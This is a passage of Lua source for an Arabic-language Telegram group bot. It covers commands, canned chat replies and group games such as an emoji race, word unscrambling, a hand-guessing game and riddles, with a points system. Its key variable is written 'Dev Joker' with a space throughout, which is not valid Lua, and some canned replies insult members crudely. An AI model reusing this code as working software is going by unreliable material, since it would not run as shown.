if not DevAbs:get(Dev Joker..'Added:Me'..msg.chat_id_) then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da and da.status_.ID == "ChatMemberStatusCreator" then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*انت منشئ المجموعة* ', 1, 'md') 
return false
end
local Added_Me = DevAbs:get(Dev Joker.."Who:Added:Me"..msg.chat_id_..':'..msg.sender_user_id_)
if Added_Me then 
tdcli_function ({ID = "GetUser",user_id_ = Added_Me},function(extra,result,success)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
Text = '⌁︙*الشخص الذي قام باضافتك هو* ↫ '..Name
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end,nil)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*انت دخلت عبر الرابط*', 1, 'md') 
end
end,nil)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*امر منو ضافني تم تعطيله من قبل المدراء*', 1, 'md') 
end
end
--     Source Joker     --
if DevAbs:get(Dev Joker.."SET:GAME"..msg.chat_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
Dev_Abs( msg.chat_id_, msg.id_, 1,"⌁︙يوجد فقط ( 6 ) اختيارات\n⌁︙ارسل اختيارك مره اخرى", 1, "md")    
return false  end 
local GETNUM = DevAbs:get(Dev Joker.."GAMES"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevAbs:del(Dev Joker.."SET:GAME"..msg.chat_id_)   
Dev_Abs( msg.chat_id_, msg.id_, 1,'⌁︙*المحيبس باليد رقم* ↫ '..NUM..'\n⌁︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, "md") 
DevAbs:incrby(Dev Joker..'bot:add:num'..msg.chat_id_..msg.sender_user_id_,5)  
elseif tonumber(NUM) ~= tonumber(GETNUM) then
DevAbs:del(Dev Joker.."SET:GAME"..msg.chat_id_)   
Dev_Abs( msg.chat_id_, msg.id_, 1,'⌁︙*المحيبس باليد رقم* ↫ '..GETNUM..'\n⌁︙*للاسف لقد خسرت حاول مره اخرى للعثور على المحيبس*', 1, "md")
end
end
end
if DevAbs:get(Dev Joker.."bot:support:link" .. msg.sender_user_id_) then
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local glink = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
local abs = "bot:supports:link"
DevAbs:set(Dev Joker..abs, glink)
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ رابط كروب الدعم الجديد ", 1, "md")
DevAbs:del(Dev Joker.."bot:support:link" .. msg.sender_user_id_)
elseif msg.content_.text_:match("^@(.*)[Bb][Oo][Tt]$") or msg.content_.text_:match("^@(.*)_[Bb][Oo][Tt]$") then
local bID = msg.content_.text_:match("@(.*)")
local abs = "bot:supports:link"
DevAbs:set(Dev Joker..abs, bID)
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ معرف الدعم الجديد ", 1, "md")
DevAbs:del(Dev Joker.."bot:support:link" .. msg.sender_user_id_)
end
end
if DevAbs:get(Dev Joker..'DevAbs4'..msg.sender_user_id_) then
DevAbs:del(Dev Joker..'DevAbs4'..msg.sender_user_id_)
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatAdministrators?chat_id='..msg.content_.text_..'')
local data = json:decode(url)
if res == 400 then
if data.description == "Bad Request: supergroup members are unavailable" then 
Dev_Abs(msg.chat_id_,msg.id_, 1, "⌁︙*لم ترفعني ادمن في قناتك ارفعني اولا*", 1 , "md")
return false 
elseif data.description == "Bad Request: chat not found" then 
Dev_Abs(msg.chat_id_,msg.id_, 1, "⌁︙*هذا المعرف غير صحيح*", 1 , "md")
return false
end end 
if not msg.content_.text_ then
Dev_Abs(msg.chat_id_,msg.id_, 1, "⌁︙*هذا المعرف غير صحيح*", 1 , "md")
return false
end
local CH_BOT = msg.content_.text_:match("(.*)")
DevAbs:set(Dev Joker..'DevAbs3',CH_BOT)
Dev_Abs(msg.chat_id_,msg.id_, 1, "⌁︙تم حفظ قناة الاشتراك الاجباري\n⌁︙الان قم برفع البوت ادمن في القناة \n⌁︙بعدها قم بتفعيل الاشتراك الاجباري ", 1 , "html")
return false
end
--     Source Joker     --
if DevAbs:get(Dev Joker.."bot:DevText" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then
DevAbs:del(Dev Joker.."bot:DevText" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
local DevText = msg.content_.text_:match("(.*)")
DevAbs:set(Dev Joker.."DevText", DevText)
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ كليشة المطور", 1, "md")
end
if text and text:match("^(.*)$") then
local ABS_PROX = DevAbs:get('ABS_PROX:'..bot_id..'namebot'..msg.sender_user_id_..'')
if ABS_PROX == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ اسم البوت ', 1, 'html')
DevAbs:set('ABS_PROX:'..bot_id..'namebot'..msg.sender_user_id_..'', 'no')
DevAbs:set('ABS_PROX:'..bot_id..'name_bot', text)
return false 
end
end
--     Source Joker     --
if text:match("^الرابط$") and ChCheck(msg) then
if not DevAbs:get(Dev Joker.."bot:tt:link:"..msg.chat_id_) then 
local link = DevAbs:get(Dev Joker.."bot:group:link"..msg.chat_id_)
if link then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙𝒈𝒓𝒐𝒖𝒑 𝒍𝒊𝒏𝒌 ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"..link, 1, "html")
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لم يتم تعيين رابط المجموعة \n⌁︙ارسل (ضع رابط) للتعيين', 1, 'md')
end
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*جلب رابط المجموعة معطل*', 1, 'md')
end
end
--     Source Joker     --
if ChatType == 'sp' or ChatType == 'gp'  then
if text:match("^انجب$") or text:match("^نجب$") or text:match("^انجبي$") or text:match("^نجبي$") or text:match("^انجبو$") or text:match("^نجبو$") then
if not DevAbs:get(Dev Joker..'bot:rep:mute'..msg.chat_id_) then
function rd_anshb(extra,result,success)
if tonumber(result.id_) == tonumber(DevId) then
rd = 'مطوريي اغلط شكد متريد نورتنه ، ♥️💪🏿'
elseif is_sudoid(result.id_) then
rd = 'مطوريي اغلط شكد متريد نورتنه ، ♥️💪🏿'
elseif is_SudoBot(result.id_) then
rd = 'احترم نفسكك لا عبالكك رافعيك مطور ، 🖕🏿♥️'
elseif is_ownerall(result.id_) then
rd = 'حبيبي راح اسامحكك لان مدير وع راسي ، 🖐🏿♥️'
elseif is_adminall(result.id_) then
rd = 'راح اسامحكك هلمره لانك ادمن ، ☝🏿♥️'
elseif is_vipall(result.id_) then
rd = 'راح احترمكك تره بس هلمره لانك مميز عندي ، ☝🏿♥️'
elseif is_absmonsh(result.id_, msg.chat_id_) then
rd = 'تاج راسيي غير انت منشئ المجموعه ،🖐🏿♥️'
elseif is_monsh(result.id_, msg.chat_id_) then
rd = 'تاج راسيي انت المنشئ الاساسي ،🖐🏿♥️'
elseif is_monshid(result.id_, msg.chat_id_) then
rd = 'حبيبي المنشئ استقبلها منكك ،👍🏿♥️'
elseif is_owner(result.id_, msg.chat_id_) then
rd = 'حبيبي راح اسامحكك لان مدير وع راسي ، 🖐🏿♥️'
elseif is_admin(result.id_, msg.chat_id_) then
rd = 'راح اسامحكك هلمره لانك ادمن ، ☝🏿♥️'
elseif is_vipmem(result.id_, msg.chat_id_) then
rd = 'راح احترمكك تره بس هلمره لانك مميز عندي ، ☝🏿♥️'
else
rd = 'لكك هوه انت عضو وجاي تغلط ؟، 🖕🏿♥️'
end
Dev_Abs(msg.chat_id_, msg.id_, 1,rd, 1, 'html')
end 
getUser(msg.sender_user_id_,rd_anshb)
end end
if text == 'دي' or text == 'ديي' or text == 'دي بابه' then if not DevAbs:get(Dev Joker..'bot:rep:mute'..msg.chat_id_) then ABS_PROX =  "آخلُِآقٌڪڪ لُِڪڪ 𖠙 😒🔪" else ABS_PROX = '' end Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end
if text == 'السلام عليكم' or text == 'سلام عليكم' then if not DevAbs:get(Dev Joker..'bot:rep:mute'..msg.chat_id_) then ABS_PROX =  "ياھَہّلْاا ۅﻋ̝̚لْيڪْم الْﺳ̭͠ لْام 𖠙 🤤♥️" else ABS_PROX = '' end Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end
if text == '😭💔' or text == '😭😭' or text == '😭😭😭' or text == '😿💔' or text == '😭😭😭' or text == '😭😭😭😭' then if not DevAbs:get(Dev Joker..'bot:rep:mute'..msg.chat_id_) then ABS_PROX =  "مآآعٍآشُ آلُِي يزعٍلُِڪڪ 𖠙 😏♥️" else ABS_PROX = '' end Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end
if text == '🌚💔' or text == '💔🌚' or text == '🚶‍♂💔' or text == '💔' or text == '😔💔' or text == '🚶‍♀💔' or text == '😭' then if not DevAbs:get(Dev Joker..'bot:rep:mute'..msg.chat_id_) then ABS_PROX =  "شبّيي اﻟ̣̣פﻟ̣̣و 𖠙 😿💔" else ABS_PROX = '' end Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end
if text == 'باي' or text == 'بااي' or text == 'اروح' or text == 'اروح احسن' or text == 'اولي احسن' or text == 'راح اروح' or text == 'باي انام' then if not DevAbs:get(Dev Joker..'bot:rep:mute'..msg.chat_id_) then ABS_PROX =  "أُرٌجُعُ عٍيدِهآآ مٍوو تنِْسةه 𖠙 🤤♥️" else ABS_PROX = '' end Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end
if text == 'هلو' or text == 'هلاو' or text == 'هلا' or text == 'هلاوو' or text == 'هيلاو' or text == 'هيلاوو' or text == 'هلاا' then if not DevAbs:get(Dev Joker..'bot:rep:mute'..msg.chat_id_) then local ABS_PROX = {  "اࠗط็لق֯ق֯ هٞللاࠗ୨و 𖠙 🤤♥️" ,  "هۂَلاا نۨہٰورتت يعمۘري 𖠙 🤤♥️" } DevAbs2 = math.random(#ABS_PROX) Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX[DevAbs2] , 1, 'md') end end
if text == 'شونك' or text == 'شونج' or text == 'شلونك' or text == 'شلونج' or text == 'شونكم' or text == 'شلونكم' or text == 'شلخبار' or text == 'شلون الاخبار' or text == 'شخبارك' then if not DevAbs:get(Dev Joker..'bot:rep:mute'..msg.chat_id_) then  local ABS_PROX = {  "ماﺷ͠ يةھَہّ يﻋ̝̚مريي ۅاﻧﺗ̲ت 𖠙 🤤♥️" ,  "الحۡمۘدللهۂَ ٰوانۨہتت 𖠙 🤤♥️",  "تمۘامۘ عمۘري ٰوانۨہتت 𖠙 🤤♥️", } DevAbs2 = math.random(#ABS_PROX) Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX[DevAbs2] , 1, 'md') Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end
if text == 'وينك' or text == 'وينج' then  if not DevAbs:get(Dev Joker..'bot:rep:mute'..msg.chat_id_) then ABS_PROX =  "مْوٌجہوٌدِ يہمْگُ يحلوُ 𖠙 😉♥️" else ABS_PROX = '' end Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end
if text == 'بوت عواي' or text == 'بوت زربه' or text == 'البوت عاوي' or text == 'البوت زربه' then  if not DevAbs:get(Dev Joker..'bot:rep:mute'..msg.chat_id_) then ABS_PROX =  "اطردكك تجرب ؟ ، 😕🔪" else  ABS_PROX = '' end  Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end
if text == 'نايمين' or text == 'ميتين' then  if not DevAbs:get(Dev Joker..'bot:rep:mute'..msg.chat_id_) then ABS_PROX =  "طُآمسين ووعٍيوونڪ 𖠙 😪🖤ۦ" else  ABS_PROX = '' end  Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end
if text == 'هلوباي' or text == 'هلو باي' then  if not DevAbs:get(Dev Joker..'bot:rep:mute'..msg.chat_id_) then ABS_PROX =  "شحۡسۜيت مۘنۨہ هيجۚ ּكتبت ؟ 🌝♥️" else  ABS_PROX = '' end  Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end
if text == 'اكلك' or text == 'اكلج' or text == 'اكلكم' then if not DevAbs:get(Dev Joker..'bot:rep:mute'..msg.chat_id_) then ABS_PROX =  "ڪوولُِ مآڪوولُِ لُِآحٍدِ 𖠙 😉♥️" else ABS_PROX = '' end Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end
if text == 'فرخ' then  if not DevAbs:get(Dev Joker..'bot:rep:mute'..msg.chat_id_) then ABS_PROX =  "ٰوينۨہهۂَ خۡل احۡصرهۂَ 𖠙 😹♥️" else  ABS_PROX = '' end  Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end
if text == 'سورس كارلوس' or text == 'سورس بروكس' or text == 'سورس فكتور' or text == 'سورس زربه' or text == 'السورس زربه' or text == 'سورس عاوي' or text == 'السورس عاوي' then if not DevAbs:get(Dev Joker..'bot:rep:mute'..msg.chat_id_) then ABS_PROX =  "لُِآ سوورس خآلُِتڪ دِي لُِڪ 𖠙 😒🔪" else ABS_PROX = '' end Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end 
end
--     Source Joker     --
if text == 'يا بوت' or text == 'بوت' or text == 'بوت بلاك' then
local Text = [[
اسمي  ]].. Name_Bot..[[ يحبيبي.
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '❍ - DEVELOPER', url = "https://t.me/"..UserName_Dev}
},
{
{text = '❍ - 𝐀𝐃𝐃 𝐓𝐇𝐄 𝐁𝐎𝐓 𝐓𝐎 𝐘𝐎𝐔𝐑 𝐆𝐑𝐎𝐔𝐏', url="https://t.me/"..User_Bot.."?startgroup=new"}
},
}

local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/'..us..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'اسم البوت' or text == 'البوت شنو اسمه' or text == 'شسمه البوت' or text == 'البوت شسمه'  then name_bot = (DevAbs:get('ABS_PROX:'..bot_id..'name_bot') or 'بروكس') local ABS_PROX = {  "مرحبا عزيزي 😻♥️ \nاسمي "..name_bot.." 😚♥️",  "هلاا يروحيي وياكك "..name_bot.." 😻♥️", } DevAbs2 = math.random(#ABS_PROX) Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX[DevAbs2] , 1, 'md') end
if text ==  ""..name_bot..' احبك' or text ==  ""..name_bot..' احبج' then name_bot = (DevAbs:get('ABS_PROX:'..bot_id..'name_bot') or 'بروكس') local ABS_PROX = {  "اعشقكك يروح "..name_bot.." 😻♥️",  "جعل محد غيركك يحبني 😻♥️" } DevAbs2 = math.random(#ABS_PROX) Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX[DevAbs2] , 1, 'md') end
if (text and text == (DevAbs:get('ABS_PROX:'..bot_id..'name_bot') or 'بروكس')) then name_bot = (DevAbs:get('ABS_PROX:'..bot_id..'name_bot') or 'بروكس') local namebot = {  '😸♥️ هلا كلبي وياك '..name_bot..' تفضل',  'ترةه مصختهاا احجيي شرايد 😕😒💔',  'اطلقق واحدد يصيح '..name_bot..' 😻♥️',  'خبصتت امنةة شتريدد عااد 🤧😒💔' } name = math.random(#namebot) Dev_Abs(msg.chat_id_, msg.id_, 1, namebot[name] , 1, 'md') return false end
--     Source Joker     --
if text =='نقاطي' and ChCheck(msg) then 
if tonumber((DevAbs:get(Dev Joker..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
DevAbs0 = '⌁︙ليس لديك نقاط العب اولا \n⌁︙ارسل ( الالعاب ) للعب'
Dev_Abs(msg.chat_id_, msg.id_, 1,DevAbs0, 1, 'md')
else 
ABS_PROX = '⌁︙عدد النقاط التي ربحتها ↫ '..(DevAbs:get(Dev Joker..'bot:add:num'..msg.chat_id_..msg.sender_user_id_))
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
end
end
if text ==  'حذف رسائلي' and ChCheck(msg) or text ==  'مسح رسائلي' and ChCheck(msg) then DevAbs:del('ABS_PROX:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف رسائلك المضافة', 1, 'md') end
--     Source Joker     --
if text == 'سمايلات' and ChCheck(msg) or text == 'السمايلات' and ChCheck(msg) then
if not DevAbs:get(Dev Joker..'bot:lock_geam'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '', 1, 'md')
else
DevAbs:del(Dev Joker..'bot:l:ids'..msg.chat_id_)
DevAbs2 = {'🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🍈','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','🍠','🥐','🍞','🥖','🥨','🧀','🥚','🍳','🥞','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🏆','🎻','🎸','🎺','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🛎','📤','🎗','🏵','🎖','🏆','🥌','🛷','🚕','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔️','🛡','🔮','🌡','💣','⏱','🛢','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(Dev Joker..'bot:klmos'..msg.chat_id_,name)
name = string.gsub(name,'🍞','🍞')
name = string.gsub(name,'🥖','🥖')
name = string.gsub(name,'🥨','🥨')
name = string.gsub(name,'🧀','🧀')
name = string.gsub(name,'🥚','🥚')
name = string.gsub(name,'🍳','🍳')
name = string.gsub(name,'🥞','🥞')
name = string.gsub(name,'🥓','🥓')
name = string.gsub(name,'🥩','🥩')
name = string.gsub(name,'🍗','🍗')
name = string.gsub(name,'🍖','🍖')
name = string.gsub(name,'🌭','🌭')
name = string.gsub(name,'🍔','🍔')
name = string.gsub(name,'🍟','🍟')
name = string.gsub(name,'🍕','🍕')
name = string.gsub(name,'🥪','🥪')
name = string.gsub(name,'🥙','🥙')
name = string.gsub(name,'🍼','🍼')
name = string.gsub(name,'☕️','☕️')
name = string.gsub(name,'🍵','🍵')
name = string.gsub(name,'🥤','🥤')
name = string.gsub(name,'🍶','🍶')
name = string.gsub(name,'🍺','🍺')
name = string.gsub(name,'🍏','🍏')
name = string.gsub(name,'🍎','🍎')
name = string.gsub(name,'🍐','🍐')
name = string.gsub(name,'🍊','🍊')
name = string.gsub(name,'🍋','🍋')
name = string.gsub(name,'🍌','🍌')
name = string.gsub(name,'🍉','🍉')
name = string.gsub(name,'🍇','🍇')
name = string.gsub(name,'🍓','🍓')
name = string.gsub(name,'🍈','🍈')
name = string.gsub(name,'🍒','🍒')
name = string.gsub(name,'🍑','🍑')
name = string.gsub(name,'🍍','🍍')
name = string.gsub(name,'🥥','🥥')
name = string.gsub(name,'🥝','🥝')
name = string.gsub(name,'🍅','🍅')
name = string.gsub(name,'🍆','🍆')
name = string.gsub(name,'🥑','🥑')
name = string.gsub(name,'🥦','🥦')
name = string.gsub(name,'🥒','🥒')
name = string.gsub(name,'🌶','🌶')
name = string.gsub(name,'🌽','🌽')
name = string.gsub(name,'🥕','🥕')
name = string.gsub(name,'🥔','🥔')
name = string.gsub(name,'🍠','🍠')
name = string.gsub(name,'🥐','🥐')
name = string.gsub(name,'🍻','🍻')
name = string.gsub(name,'🏀','🏀')
name = string.gsub(name,'⚽️','⚽️')
name = string.gsub(name,'🏈','🏈')
name = string.gsub(name,'⚾️','⚾️')
name = string.gsub(name,'🎾','🎾')
name = string.gsub(name,'🏐','🏐')
name = string.gsub(name,'🏉','🏉')
name = string.gsub(name,'🎱','🎱')
name = string.gsub(name,'🏓','🏓')
name = string.gsub(name,'🏸','🏸')
name = string.gsub(name,'🥅','🥅')
name = string.gsub(name,'🎰','🎰')
name = string.gsub(name,'🎮','🎮')
name = string.gsub(name,'🎳','🎳')
name = string.gsub(name,'🎯','🎯')
name = string.gsub(name,'🏆','🏆')
name = string.gsub(name,'🎻','🎻')
name = string.gsub(name,'🎸','🎸')
name = string.gsub(name,'🎺','🎺')
name = string.gsub(name,'🥁','🥁')
name = string.gsub(name,'🎹','🎹')
name = string.gsub(name,'🎼','🎼')
name = string.gsub(name,'🎧','🎧')
name = string.gsub(name,'🎤','🎤')
name = string.gsub(name,'🎬','🎬')
name = string.gsub(name,'🎨','🎨')
name = string.gsub(name,'🎭','🎭')
name = string.gsub(name,'🎪','🎪')
name = string.gsub(name,'🛎','🛎')
name = string.gsub(name,'📤','📤')
name = string.gsub(name,'🎗','🎗')
name = string.gsub(name,'🏵','🏵')
name = string.gsub(name,'🎖','🎖')
name = string.gsub(name,'🏆','🏆')
name = string.gsub(name,'🥌','🥌')
name = string.gsub(name,'🛷','🛷')
name = string.gsub(name,'🚕','🚕')
name = string.gsub(name,'🚗','🚗')
name = string.gsub(name,'🚙','🚙')
name = string.gsub(name,'🚌','🚌')
name = string.gsub(name,'🚎','🚎')
name = string.gsub(name,'🏎','🏎')
name = string.gsub(name,'🚓','🚓')
name = string.gsub(name,'🚑','🚑')
name = string.gsub(name,'🚚','🚚')
name = string.gsub(name,'🚛','🚛')
name = string.gsub(name,'🚜','🚜')
name = string.gsub(name,'🇮🇶','🇮🇶')
name = string.gsub(name,'⚔️','⚔️')
name = string.gsub(name,'🛡','🛡')
name = string.gsub(name,'🔮','🔮')
name = string.gsub(name,'🌡','🌡')
name = string.gsub(name,'💣','💣')
name = string.gsub(name,'⏱','⏱')
name = string.gsub(name,'🛢','🛢')
name = string.gsub(name,'📒','📒')
name = string.gsub(name,'📗','📗')
name = string.gsub(name,'📅','📆')
name = string.gsub(name,'📪','📪')
name = string.gsub(name,'📫','📫')
name = string.gsub(name,'📬','📬')
name = string.gsub(name,'📭','📭')
name = string.gsub(name,'⏰','⏰')
name = string.gsub(name,'📺','📺')
name = string.gsub(name,'🎚','🎚')
name = string.gsub(name,'☎️','☎️')
ABS_PROX = '⌁︙اول واحد يدز هذا السمايل {'..name..'} يربح '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
end end
if text == ''..(DevAbs:get(Dev Joker..'bot:klmos'..msg.chat_id_) or 'qssp')..'' and not DevAbs:get(Dev Joker..'bot:l:ids'..msg.chat_id_) then
if not DevAbs:get(Dev Joker..'bot:l:ids'..msg.chat_id_) then 
ABS_PROX = '⌁︙لقد ربحت وحصلت على نقطة \n⌁︙ارسل ( سمايلات ) للعب مره اخرى \n '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
DevAbs:incrby(Dev Joker..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(Dev Joker..'bot:l:ids'..msg.chat_id_,true)
end
if text == 'ترتيب' and ChCheck(msg) or text == 'الترتيب' and ChCheck(msg) then
if not DevAbs:get(Dev Joker..'bot:lock_geam'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '', 1, 'md')
else
DevAbs:del(Dev Joker..'bot:l:id'..msg.chat_id_)
DevAbs2 = {'سحور','سياره','استقبال','قنفه','ايفون','بزونه','مطبخ','كرستيانو','دجاجه','مدرسه','الوان','غرفه','ثلاجه','كهوه','سفينه','العراق','محطه','طياره','رادار','منزل','مستشفى','كهرباء','تفاحه','اخطبوط','سلمون','فرنسا','برتقاله','تفاح','مطرقه','بتيته','لهانه','شباك','باص','سمكه','ذباب','تلفاز','حاسوب','انترنيت','ساحه','جسر'};
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(Dev Joker..'bot:klmo'..msg.chat_id_,name)
name = string.gsub(name,'سحور','س ر و ح')
name = string.gsub(name,'سياره','ه ر س ي ا')
name = string.gsub(name,'استقبال','ل ب ا ت ق س ا')
name = string.gsub(name,'قنفه','ه ق ن ف')
name = string.gsub(name,'ايفون','و ن ف ا')
name = string.gsub(name,'بزونه','ز و ه ن')
name = string.gsub(name,'مطبخ','خ ب ط م')
name = string.gsub(name,'كرستيانو','س ت ا ن و ك ر ي')
name = string.gsub(name,'دجاجه','ج ج ا د ه')
name = string.gsub(name,'مدرسه','ه م د ر س')
name = string.gsub(name,'الوان','ن ا و ا ل')
name = string.gsub(name,'غرفه','غ ه ر ف')
name = string.gsub(name,'ثلاجه','ج ه ت ل ا')
name = string.gsub(name,'كهوه','ه ك ه و')
name = string.gsub(name,'سفينه','ه ن ف ي س')
name = string.gsub(name,'العراق','ق ع ا ل ر ا')
name = string.gsub(name,'محطه','ه ط م ح')
name = string.gsub(name,'طياره','ر ا ط ي ه')
name = string.gsub(name,'رادار','ر ا ر ا د')
name = string.gsub(name,'منزل','ن ز م ل')
name = string.gsub(name,'مستشفى','ى ش س ف ت م')
name = string.gsub(name,'كهرباء','ر ب ك ه ا ء')
name = string.gsub(name,'تفاحه','ح ه ا ت ف')
name = string.gsub(name,'اخطبوط','ط ب و ا خ ط')
name = string.gsub(name,'سلمون','ن م و ل س')
name = string.gsub(name,'فرنسا','ن ف ر س ا')
name = string.gsub(name,'برتقاله','ر ت ق ب ا ه ل')
name = string.gsub(name,'تفاح','ح ف ا ت')
name = string.gsub(name,'مطرقه','ه ط م ر ق')
name = string.gsub(name,'بتيته','ب ت ت ي ه')
name = string.gsub(name,'لهانه','ه ن ل ه ل')
name = string.gsub(name,'شباك','ب ش ا ك')
name = string.gsub(name,'باص','ص ا ب')
name = string.gsub(name,'سمكه','ك س م ه')
name = string.gsub(name,'ذباب','ب ا ب ذ')
name = string.gsub(name,'تلفاز','ت ف ل ز ا')
name = string.gsub(name,'حاسوب','س ا ح و ب')
name = string.gsub(name,'انترنيت','ا ت ن ر ن ي ت')
name = string.gsub(name,'ساحه','ح ا ه س')
name = string.gsub(name,'جسر','ر ج س')
ABS_PROX = '⌁︙اول واحد يرتبها {'..name..'} يربح '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
end end
if text == ''..(DevAbs:get(Dev Joker..'bot:klmo'..msg.chat_id_) or 'qssp')..'' and not DevAbs:get(Dev Joker..'bot:l:id'..msg.chat_id_) then
if not DevAbs:get(Dev Joker..'bot:l:id'..msg.chat_id_) then 
ABS_PROX = '⌁︙لقد ربحت وحصلت على نقطة \n⌁︙ارسل ( ترتيب ) للعب مره اخرى \n '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
DevAbs:incrby(Dev Joker..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(Dev Joker..'bot:l:id'..msg.chat_id_,true)
end
if text == 'محيبس' and ChCheck(msg) or text == 'بات' and ChCheck(msg) or text == 'المحيبس' and ChCheck(msg) then
if not DevAbs:get(Dev Joker..'bot:lock_geam'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '', 1, 'md')
else
Num = math.random(1,6)
DevAbs:set(Dev Joker.."GAMES"..msg.chat_id_,Num) 
TEST = [[
➀       ➁       ➂       ➃       ➄       ➅
↓       ↓       ↓       ↓       ↓       ↓
👊 ‹› 👊🏻 ‹› 👊🏼 ‹› 👊🏽 ‹› 👊🏾 ‹› 👊🏿

⌁︙اختر رقم لاستخراج المحيبس
⌁︙الفائز يحصل على (5) نقاط
]]
Dev_Abs( msg.chat_id_, msg.id_, 1, TEST, 1, "md") 
DevAbs:setex(Dev Joker.."SET:GAME"..msg.chat_id_, 100, true)  
return false  
end end
if text == 'حزوره' and ChCheck(msg) or text == 'الحزوره' and ChCheck(msg) then
if not DevAbs:get(Dev Joker..'bot:lock_geam'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '', 1, 'md')
else
DevAbs:del(Dev Joker..'bot:l:id'..msg.chat_id_)
DevAbs2 = {'الجرس','عقرب الساعه','السمك','المطر','5','الكتاب','البسمار','7','الكعبه','بيت الشعر','لهانه','انا','امي','الابره','الساعه','22','غلط','كم الساعه','البيتنجان','البيض','المرايه','الضوء','الهواء','الضل','العمر','القلم','المشط','الحفره','البحر','الثلج','الاسفنج','الصوت','بلم'};
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(Dev Joker..'bot:bkbk'..msg.chat_id_,name)
name = string.gsub(name,'الجرس','شيئ اذا لمسته صرخ ما هوه ؟')
name = string.gsub(name,'عقرب الساعه','اخوان لا يستطيعان تمضيه اكثر من دقيقه معا فما هما ؟')
name = string.gsub(name,'السمك','ما هو الحيوان الذي لم يصعد الى سفينة نوح عليه السلام ؟')
